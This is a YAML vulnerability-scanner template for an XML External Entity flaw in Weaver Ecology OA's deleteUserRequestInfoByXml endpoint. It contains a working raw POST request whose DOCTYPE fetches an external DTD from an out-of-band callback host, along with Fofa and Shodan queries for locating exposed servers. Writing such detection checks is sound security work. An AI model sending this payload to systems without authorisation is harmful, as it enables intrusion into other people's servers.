id: ecology-oa-byxml-xxe
info:
  name: EcologyOA deleteUserRequestInfoByXml - XML External Entity Injection
  author: SleepingBag945
  severity: high
  description: |
    EcologyOA deleteUserRequestInfoByXml interface has XXE
  classification:
    cwe-id:
      - CWE-611
      - CWE-918
  metadata:
    runzero-review: REJECT/2025-11-07/uses interactsh
    fofa-query: app="泛微-协同办公OA"
    max-request: 1
    shodan-query: ecology_JSessionid
    verified: true
  tags: ecology-oa,vuln,xxe
http:
  - matchers:
      - part: body
        type: word
        words:
          - WfData
      - part: header
        type: word
        words:
          - application/xml
      - part: interactsh_protocol
        type: word
        words:
          - dns
    matchers-condition: and
    raw:
      - |
        POST /rest/ofs/deleteUserRequestInfoByXml HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml
        Accept-Encoding: gzip

        <?xml version="1.0" encoding="utf-8"?>
        <!DOCTYPE syscode SYSTEM "http://{{interactsh-url}}">
        <M><syscode>&send;</syscode></M>
